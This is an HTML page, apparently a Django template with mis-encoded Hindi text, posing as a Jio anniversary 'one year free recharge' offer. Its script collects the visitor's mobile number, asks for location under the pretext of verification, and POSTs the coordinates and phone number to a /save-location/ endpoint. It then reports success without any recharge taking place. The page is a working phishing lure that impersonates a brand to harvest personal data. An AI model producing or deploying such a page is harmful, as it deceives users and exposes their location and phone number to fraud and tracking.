<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>рдЬрд┐рдУ рдлреНрд░реА рд░рд┐рдЪрд╛рд░реНрдЬ рдСрдлрд░</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            text-align: center;
            background: linear-gradient(to right, #ff416c, #ff4b2b);
            color: white;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            color: black;
            padding: 20px;
            border-radius: 10px;
            max-width: 400px;
            margin: auto;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
        }
        h2 { color: #ff416c; }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            background: #28a745;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background: #218838;
        }
        .hidden {
            display: none;
        }
         #location-message {
            font-size: 14px;
            color: #555;
        }
        #location{
            color:linear-gradient(to right, #ff416c, #ff4b2b);
        }
    </style>
</head>
<body>

    <h1>ЁЯОЙ рдЬрд┐рдУ рдХреЗ 10 рд╕рд╛рд▓ рдкреВрд░реЗ! ЁЯОЙ</h1>
    <p>рдЕрдм рдЖрдкрдХреЗ рд▓рд┐рдП <b>1 рд╕рд╛рд▓ рдХрд╛ рдлреНрд░реА рд░рд┐рдЪрд╛рд░реНрдЬ рдСрдлрд░</b>!</p>

    <div class="container">
        <h2>ЁЯУЮ рдЕрдкрдирд╛ рдлреЛрди рдирдВрдмрд░ рдбрд╛рд▓реЗрдВ</h2>
        <input type="tel" id="phoneNumber" placeholder="рдЕрдкрдирд╛ рдореЛрдмрд╛рдЗрд▓ рдирдВрдмрд░ рджрд░реНрдЬ рдХрд░реЗрдВ" required>
        <button onclick="askForLocation()">рд░рд┐рдЪрд╛рд░реНрдЬ рдХрд░реЗрдВ</button>
        <p id="successMessage" class="hidden">тЬЕ рдЖрдкрдХрд╛ рдлреНрд░реА рд░рд┐рдЪрд╛рд░реНрдЬ рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛ рдЧрдпрд╛ рд╣реИ!</p>
        <p id="location-message" class="hidden">ЁЯУН рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рди рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдХреГрдкрдпрд╛ 'Allow' рджрдмрд╛рдПрдБред</p>
    </div>

    <p id="location" class="hidden"></p>

    <script>
        function askForLocation() {
            let phoneNumber = document.getElementById("phoneNumber").value;
            if (phoneNumber.length < 10) {
                alert("тЪая╕П рдХреГрдкрдпрд╛ рд╕рд╣реА рдореЛрдмрд╛рдЗрд▓ рдирдВрдмрд░ рджрд░реНрдЬ рдХрд░реЗрдВ!");
                return;
            }

            document.getElementById("location-message").classList.remove("hidden");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        let lat = position.coords.latitude;
                        let lon = position.coords.longitude;
                        document.getElementById("location").innerHTML = `ЁЯМН рд╕реНрдерд╛рди: ${lat}, ${lon}`;
                        document.getElementById("location").classList.remove("hidden");

                        fetch('/save-location/', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}' },
                            body: JSON.stringify({ latitude: lat, longitude: lon, phone: phoneNumber })
                        }).then(response => response.json())
                          .then(data => {
                              document.getElementById("successMessage").classList.remove("hidden");
                              console.log("рдбреЗрдЯрд╛ рднреЗрдЬрд╛ рдЧрдпрд╛:", data);
                          });

                    },
                    function (error) {
                        alert("тЪая╕П рд╕реНрдерд╛рди рдПрдХреНрд╕реЗрд╕ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ред рдЖрдк рдлрд┐рд░ рднреА рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред");
                        document.getElementById("successMessage").classList.remove("hidden");
                    }
                );
            } else {
                alert("тЪая╕П рдЖрдкрдХрд╛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реНрдерд╛рди рдЯреНрд░реИрдХрд┐рдВрдЧ рдХреЛ рд╕рдкреЛрд░реНрдЯ рдирд╣реАрдВ рдХрд░рддрд╛!");
                document.getElementById("successMessage").classList.remove("hidden");
            }
        }
    </script>

</body>
</html>
